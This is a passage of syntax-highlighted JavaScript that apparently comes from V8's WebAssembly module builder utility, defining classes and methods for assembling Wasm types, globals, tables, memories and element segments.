    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> loc_name <span class="hljs-keyword">of</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">local_names</span>) {
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> loc_name == <span class="hljs-string">&#x27;string&#x27;</span>) ++num_local_names;
    }
    <span class="hljs-keyword">return</span> num_local_names;
  }

  <span class="hljs-title function_">exportAs</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">module</span>.<span class="hljs-title function_">addExport</span>(name, <span class="hljs-variable language_">this</span>.<span class="hljs-property">index</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">exportFunc</span>(<span class="hljs-params"></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">exportAs</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">addBody</span>(<span class="hljs-params">body</span>) {
    <span class="hljs-title function_">checkExpr</span>(body);
    <span class="hljs-comment">// Store a copy of the body, and automatically add the end opcode.</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">body</span> = body.<span class="hljs-title function_">concat</span>([kExprEnd]);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">addBodyWithEnd</span>(<span class="hljs-params">body</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">body</span> = body;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">getNumLocals</span>(<span class="hljs-params"></span>) {
    <span class="hljs-keyword">let</span> total_locals = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> l <span class="hljs-keyword">of</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">locals</span>) {
      total_locals += l.<span class="hljs-property">count</span>
    }
    <span class="hljs-keyword">return</span> total_locals;
  }

  <span class="hljs-title function_">addLocals</span>(<span class="hljs-params">type, count, names</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">locals</span>.<span class="hljs-title function_">push</span>({<span class="hljs-attr">type</span>: type, <span class="hljs-attr">count</span>: count});
    names = names || [];
    <span class="hljs-keyword">if</span> (names.<span class="hljs-property">length</span> &gt; count) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;too many locals names given&#x27;</span>);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">local_names</span>.<span class="hljs-title function_">push</span>(...names);
    <span class="hljs-keyword">if</span> (count &gt; names.<span class="hljs-property">length</span>) <span class="hljs-variable language_">this</span>.<span class="hljs-property">local_names</span>.<span class="hljs-title function_">push</span>(count - names.<span class="hljs-property">length</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">end</span>(<span class="hljs-params"></span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">module</span>;
  }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">WasmGlobalBuilder</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-variable language_">module</span>, type, mutable, shared, init</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">module</span> = <span class="hljs-variable language_">module</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">type</span> = type;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">mutable</span> = mutable;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">shared</span> = shared;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">init</span> = init;
  }

  <span class="hljs-title function_">exportAs</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">module</span>.<span class="hljs-property">exports</span>.<span class="hljs-title function_">push</span>(
        {<span class="hljs-attr">name</span>: name, <span class="hljs-attr">kind</span>: kExternalGlobal, <span class="hljs-attr">index</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">index</span>});
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">checkExpr</span>(<span class="hljs-params">expr</span>) {
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> b <span class="hljs-keyword">of</span> expr) {
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> b !== <span class="hljs-string">&#x27;number&#x27;</span> || (b &amp; (~<span class="hljs-number">0xFF</span>)) !== <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(
          <span class="hljs-string">&#x27;invalid body (entries must be 8 bit numbers): &#x27;</span> + expr);
    }
  }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">WasmTableBuilder</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-variable language_">module</span>, type, initial_size, max_size, init_expr, is_shared, is_table64</span>) {
    <span class="hljs-comment">// TODO(manoskouk): Add the table index.</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">module</span> = <span class="hljs-variable language_">module</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">type</span> = type;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">initial_size</span> = initial_size;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">has_max</span> = max_size !== <span class="hljs-literal">undefined</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">max_size</span> = max_size;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">init_expr</span> = init_expr;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">has_init</span> = init_expr !== <span class="hljs-literal">undefined</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">is_shared</span> = is_shared;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">is_table64</span> = is_table64;
  }

  <span class="hljs-title function_">exportAs</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">module</span>.<span class="hljs-property">exports</span>.<span class="hljs-title function_">push</span>(
        {<span class="hljs-attr">name</span>: name, <span class="hljs-attr">kind</span>: kExternalTable, <span class="hljs-attr">index</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">index</span>});
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">makeField</span>(<span class="hljs-params">type, mutability</span>) {
  <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">typeof</span> mutability) != <span class="hljs-string">&#x27;boolean&#x27;</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;field mutability must be boolean&#x27;</span>);
  }
  <span class="hljs-keyword">return</span> {<span class="hljs-attr">type</span>: type, <span class="hljs-attr">mutability</span>: mutability};
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">MustBeNumber</span>(<span class="hljs-params">x, name</span>) {
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> x !== <span class="hljs-string">&#x27;undefined&#x27;</span> &amp;&amp; <span class="hljs-keyword">typeof</span> x !== <span class="hljs-string">&#x27;number&#x27;</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`<span class="hljs-subst">${name}</span> must be a number, was <span class="hljs-subst">${x}</span>`</span>);
  }
  <span class="hljs-keyword">return</span> x;
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">WasmStruct</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">fields, is_final, is_shared, supertype_idx</span>) {
    <span class="hljs-keyword">let</span> descriptor = <span class="hljs-literal">undefined</span>;
    <span class="hljs-keyword">let</span> describes = <span class="hljs-literal">undefined</span>;
    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(fields)) {
      <span class="hljs-comment">// Fall through.</span>
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fields.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Object</span>) {
      <span class="hljs-comment">// Options bag.</span>
      is_final = fields.<span class="hljs-property">is_final</span> ?? fields.<span class="hljs-property">final</span> ?? <span class="hljs-literal">false</span>;
      is_shared = fields.<span class="hljs-property">is_shared</span> ?? fields.<span class="hljs-property">shared</span> ?? <span class="hljs-literal">false</span>;
      supertype_idx = <span class="hljs-title class_">MustBeNumber</span>(
          fields.<span class="hljs-property">supertype_idx</span> ?? fields.<span class="hljs-property">supertype</span> ?? kNoSuperType,
          <span class="hljs-string">&quot;supertype&quot;</span>);
      descriptor = <span class="hljs-title class_">MustBeNumber</span>(fields.<span class="hljs-property">descriptor</span>, <span class="hljs-string">&quot;&#x27;descriptor&#x27;&quot;</span>);
      describes = <span class="hljs-title class_">MustBeNumber</span>(fields.<span class="hljs-property">describes</span>, <span class="hljs-string">&quot;&#x27;describes&#x27;&quot;</span>);
      fields = fields.<span class="hljs-property">fields</span> ?? [];  <span class="hljs-comment">// This must happen last.</span>
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;struct fields must be an array&#x27;</span>);
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">fields</span> = fields;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">type_form</span> = kWasmStructTypeForm;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">is_final</span> = is_final;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">is_shared</span> = is_shared;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">supertype</span> = supertype_idx;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">descriptor</span> = descriptor;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">describes</span> = describes;
  }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">WasmArray</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">type, mutability, is_final, is_shared, supertype_idx</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">type</span> = type;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">mutability</span> = mutability;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">type_form</span> = kWasmArrayTypeForm;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">is_final</span> = is_final;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">is_shared</span> = is_shared;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">supertype</span> = supertype_idx;
  }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">WasmCont</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">type_index</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">type_index</span> = type_index;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">supertype</span> = kNoSuperType;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">is_final</span> = <span class="hljs-literal">true</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">is_shared</span> = <span class="hljs-literal">false</span>;
  }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">WasmElemSegment</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">table, offset, type, elements, is_decl, is_shared</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">table</span> = table;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">offset</span> = offset;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">type</span> = type;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">elements</span> = elements;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">is_decl</span> = is_decl;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">is_shared</span> = is_shared;
    <span class="hljs-comment">// Invariant checks.</span>
    <span class="hljs-keyword">if</span> ((table === <span class="hljs-literal">undefined</span>) != (offset === <span class="hljs-literal">undefined</span>)) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;invalid element segment&quot;</span>);
    }
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> elem <span class="hljs-keyword">of</span> elements) {
      <span class="hljs-keyword">if</span> (((<span class="hljs-keyword">typeof</span> elem) == <span class="hljs-string">&#x27;number&#x27;</span>) != (type === <span class="hljs-literal">undefined</span>)) {
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;invalid element&quot;</span>);
      }
    }
  }

  <span class="hljs-title function_">is_active</span>(<span class="hljs-params"></span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">table</span> !== <span class="hljs-literal">undefined</span>;
  }

  <span class="hljs-title function_">is_passive</span>(<span class="hljs-params"></span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">table</span> === <span class="hljs-literal">undefined</span> &amp;&amp; !<span class="hljs-variable language_">this</span>.<span class="hljs-property">is_decl</span>;
  }

  <span class="hljs-title function_">is_declarative</span>(<span class="hljs-params"></span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">table</span> === <span class="hljs-literal">undefined</span> &amp;&amp; <span class="hljs-variable language_">this</span>.<span class="hljs-property">is_decl</span>;
  }

  <span class="hljs-title function_">expressions_as_elements</span>(<span class="hljs-params"></span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">type</span> !== <span class="hljs-literal">undefined</span>;
  }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">WasmModuleBuilder</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">types</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">imports</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">exports</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">stringrefs</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">globals</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tables</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tags</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">memories</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">functions</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">element_segments</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">data_segments</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">explicit</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">rec_groups</span> = [];
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">compilation_priorities</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">instruction_frequencies</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">call_targets</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">start_index</span> = <span class="hljs-literal">undefined</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">num_imported_funcs</span> = <span class="hljs-number">0</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">num_imported_globals</span> = <span class="hljs-number">0</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">num_imported_tables</span> = <span class="hljs-number">0</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">num_imported_tags</span> = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">addStart</span>(<span class="hljs-params">start_index</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">start_index</span> = start_index;
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">addMemory</span>(<span class="hljs-params">min, max, shared</span>) {
    <span class="hljs-comment">// Note: All imported memories are added before declared ones (see the check</span>
    <span class="hljs-comment">// in {addImportedMemory}).</span>
    <span class="hljs-keyword">const</span> imported_memories =
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">imports</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">i</span> =&gt;</span> i.<span class="hljs-property">kind</span> == kExternalMemory).<span class="hljs-property">length</span>;
    <span class="hljs-keyword">const</span> mem_index = imported_memories + <span class="hljs-variable language_">this</span>.<span class="hljs-property">memories</span>.<span class="hljs-property">length</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">memories</span>.<span class="hljs-title function_">push</span>(
        {<span class="hljs-attr">min</span>: min, <span class="hljs-attr">max</span>: max, <span class="hljs-attr">shared</span>: shared || <span class="hljs-literal">false</span>, <span class="hljs-attr">is_memory64</span>: <span class="hljs-literal">false</span>});
    <span class="hljs-keyword">return</span> mem_index;
  }

  <span class="hljs-title function_">addMemory64</span>(<span class="hljs-params">min, max, shared</span>) {
    <span class="hljs-comment">// Note: All imported memories are added before declared ones (see the check</span>
    <span class="hljs-comment">// in {addImportedMemory}).</span>
    <span class="hljs-keyword">const</span> imported_memories =
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">imports</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">i</span> =&gt;</span> i.<span class="hljs-property">kind</span> == kExternalMemory).<span class="hljs-property">length</span>;
    <span class="hljs-keyword">const</span> mem_index = imported_memories + <span class="hljs-variable language_">this</span>.<span class="hljs-property">memories</span>.<span class="hljs-property">length</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">memories</span>.<span class="hljs-title function_">push</span>(
        {<span class="hljs-attr">min</span>: min, <span class="hljs-attr">max</span>: max, <span class="hljs-attr">shared</span>: shared || <span class="hljs-literal">false</span>, <span class="hljs-attr">is_memory64</span>: <span class="hljs-literal">true</span>});
    <span class="hljs-keyword">return</span> mem_index;
  }

  <span class="hljs-title function_">addExplicitSection</span>(<span class="hljs-params">bytes</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">explicit</span>.<span class="hljs-title function_">push</span>(bytes);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;
  }

  <span class="hljs-title function_">stringToBytes</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-keyword">var</span> result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Binary</span>();
    result.<span class="hljs-title function_">emit_u32v</span>(name.<span class="hljs-property">length</span>);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; name.<span class="hljs-property">length</span>; i++) {
      result.<span class="hljs-title function_">emit_u8</span>(name.<span class="hljs-title function_">charCodeAt</span>(i));
    }
    <span class="hljs-keyword">return</span> result.<span class="hljs-title function_">trunc_buffer</span>()
  }

  <span class="hljs-title function_">createCustomSection</span>(<span class="hljs-params">name, bytes</span>) {
    name = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">stringToBytes</span>(name);
    <span class="hljs-keyword">var</span> section = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Binary</span>();
    section.<span class="hljs-title function_">emit_u8</span>(<span class="hljs-number">0</span>);
    section.<span class="hljs-title function_">emit_u32v</span>(name.<span class="hljs-property">length</span> + bytes.<span class="hljs-property">length</span>);
    section.<span class="hljs-title function_">emit_bytes</span>(name);
    section.<span class="hljs-title function_">emit_bytes</span>(bytes);
    <span class="hljs-keyword">return</span> section.<span class="hljs-title function_">trunc_buffer</span>();
  }

  <span class="hljs-title function_">addCustomSection</span>(<span class="hljs-params">name, bytes</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">explicit</span>.<span class="hljs-title function_">push</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">createCustomSection</span>(name, bytes));
  }

  <span class="hljs-comment">// We use {is_final = true} so that the MVP syntax is generated for</span>
  <span class="hljs-comment">// signatures.</span>
  <span class="hljs-title function_">addType</span>(<span class="hljs-params">type, supertype_idx = kNoSuperType, is_final = <span class="hljs-literal">true</span>,
          is_shared = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-keyword">var</span> pl = type.<span class="hljs-property">params</span>.<span class="hljs-property">length</span>;   <span class="hljs-comment">// should have params</span>
    <span class="hljs-keyword">var</span> rl = type.<span class="hljs-property">results</span>.<span class="hljs-property">length</span>;  <span class="hljs-comment">// should have results</span>
    <span class="hljs-keyword">var</span> type_copy = {<span class="hljs-attr">params</span>: type.<span class="hljs-property">params</span>, <span class="hljs-attr">results</span>: type.<span class="hljs-property">results</span>,
                     <span class="hljs-attr">is_final</span>: is_final, <span class="hljs-attr">is_shared</span>: is_shared,
                     <span class="hljs-attr">supertype</span>: supertype_idx};
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">types</span>.<span class="hljs-title function_">push</span>(type_copy);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">types</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>;
  }

  <span class="hljs-title function_">addLiteralStringRef</span>(<span class="hljs-params">str</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">stringrefs</span>.<span class="hljs-title function_">push</span>(str);
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">stringrefs</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>;
  }

  <span class="hljs-comment">// {fields} may be a list of fields, in which case the other parameters are</span>
  <span class="hljs-comment">// relevant; or an options bag, which replaces the other parameters.</span>
  <span class="hljs-comment">// Example: addStruct({fields: [...], supertype: 3})</span>
  <span class="hljs-title function_">addStruct</span>(<span class="hljs-params">fields, supertype_idx = kNoSuperType, is_final = <span class="hljs-literal">false</span>,
            is_shared = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">types</span>.<span class="hljs-title function_">push</span>(
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">WasmStruct</span>(fields, is_final, is_shared, supertype_idx));
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">types</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>;
  }

  <span class="hljs-title function_">addArray</span>(<span class="hljs-params">type, mutability, supertype_idx = kNoSuperType, is_final = <span class="hljs-literal">false</span>,
           is_shared = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">types</span>.<span class="hljs-title function_">push</span>(
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">WasmArray</span>(type, mutability, is_final, is_shared, supertype_idx));
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">types</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>;
  }

  <span class="hljs-title function_">addCont</span>(<span class="hljs-params">type</span>) {
    <span class="hljs-keyword">let</span> type_index = (<span class="hljs-keyword">typeof</span> type) == <span class="hljs-string">&#x27;number&#x27;</span> ? type : <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addType</span>(type);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">types</span>.<span class="hljs-title function_">push</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WasmCont</span>(type_index));
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">types</span>.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>;
  }


  <span class="hljs-title function_">nextTypeIndex</span>(<span class="hljs-params"></span>) { <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">types</span>.<span class="hljs-property">length</span>; }

  <span class="hljs-keyword">static</span> <span class="hljs-title function_">defaultFor</span>(<span class="hljs-params">type</span>) {
    <span class="hljs-keyword">switch</span> (type) {
      <span class="hljs-keyword">case</span> <span class="hljs-attr">kWasmI32</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">wasmI32Const</span>(<span class="hljs-number">0</span>);
      <span class="hljs-keyword">case</span> <span class="hljs-attr">kWasmI64</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">wasmI64Const</span>(<span class="hljs-number">0</span>);
      <span class="hljs-keyword">case</span> <span class="hljs-attr">kWasmF32</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">wasmF32Const</span>(<span class="hljs-number">0.0</span>);
      <span class="hljs-keyword">case</span> <span class="hljs-attr">kWasmF64</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">wasmF64Const</span>(<span class="hljs-number">0.0</span>);
      <span class="hljs-keyword">case</span> <span class="hljs-attr">kWasmS128</span>:
        <span class="hljs-keyword">return</span> [kSimdPrefix, kExprS128Const, ...(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">fill</span>(<span class="hljs-number">0</span>))];
      <span class="hljs-keyword">case</span> <span class="hljs-attr">kWasmStringViewIter</span>:
      <span class="hljs-keyword">case</span> <span class="hljs-attr">kWasmStringViewWtf8</span>:
      <span class="hljs-keyword">case</span> <span class="hljs-attr">kWasmStringViewWtf16</span>:
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;String views are non-defaultable&quot;</span>);
      <span class="hljs-attr">default</span>:
        <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">typeof</span> type) != <span class="hljs-string">&#x27;number&#x27;</span> &amp;&amp; type.<span class="hljs-property">opcode</span> != kWasmRefNull) {
          <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;Non-defaultable type&quot;</span>);
        }
        <span class="hljs-keyword">let</span> heap_type = (<span class="hljs-keyword">typeof</span> type) == <span class="hljs-string">&#x27;number&#x27;</span> ? type : type.<span class="hljs-property">heap_type</span>;
        <span class="hljs-keyword">return</span> [kExprRefNull, ...<span class="hljs-title function_">wasmSignedLeb</span>(heap_type, kMaxVarInt32Size)];
    }
  }

  <span class="hljs-title function_">addGlobal</span>(<span class="hljs-params">type, mutable, shared, init</span>) {
    <span class="hljs-keyword">if</span> (init === <span class="hljs-literal">undefined</span>) init = <span class="hljs-title class_">WasmModuleBuilder</span>.<span class="hljs-title function_">defaultFor</span>(type);
    <span class="hljs-title function_">checkExpr</span>(init);
    <span class="hljs-keyword">let</span> glob = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WasmGlobalBuilder</span>(<span class="hljs-variable language_">this</span>, type, mutable, shared, init);
    glob.<span class="hljs-property">index</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">globals</span>.<span class="hljs-property">length</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">num_imported_globals</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">globals</span>.<span class="hljs-title function_">push</span>(glob);
    <span class="hljs-keyword">return</span> glob;
  }

  <span class="hljs-title function_">addTable</span>(<span class="hljs-params">
      type, initial_size, max_size = <span class="hljs-literal">undefined</span>, init_expr = <span class="hljs-literal">undefined</span>,
      is_shared = <span class="hljs-literal">false</span>, is_table64 = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-keyword">if</span> (type == kWasmI32 || type == kWasmI64 || type == kWasmF32 ||
        type == kWasmF64 || type == kWasmS128 || type == kWasmVoid) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;Tables must be of a reference type&#x27;</span>);
    }
    <span class="hljs-keyword">if</span> (init_expr != <span class="hljs-literal">undefined</span>) <span class="hljs-title function_">checkExpr</span>(init_expr);
    <span class="hljs-keyword">let</span> table = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WasmTableBuilder</span>(
        <span class="hljs-variable language_">this</span>, type, initial_size, max_size, init_expr, is_shared, is_table64);
    table.<span class="hljs-property">index</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">tables</span>.<span class="hljs-property">length</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">num_imported_tables</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tables</span>.<span class="hljs-title function_">push</span>(table);
    <span class="hljs-keyword">return</span> table;
  }

  <span class="hljs-title function_">addTable64</span>(<span class="hljs-params">
      type, initial_size, max_size = <span class="hljs-literal">undefined</span>, init_expr = <span class="hljs-literal">undefined</span>,
      is_shared = <span class="hljs-literal">false</span></span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addTable</span>(
        type, initial_size, max_size, init_expr, is_shared, <span class="hljs-literal">true</span>);
  }

  <span class="hljs-title function_">addTag</span>(<span class="hljs-params">type</span>) {
    <span class="hljs-keyword">let</span> type_index = (<span class="hljs-keyword">typeof</span> type) == <span class="hljs-string">&#x27;number&#x27;</span> ? type : <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addType</span>(type);
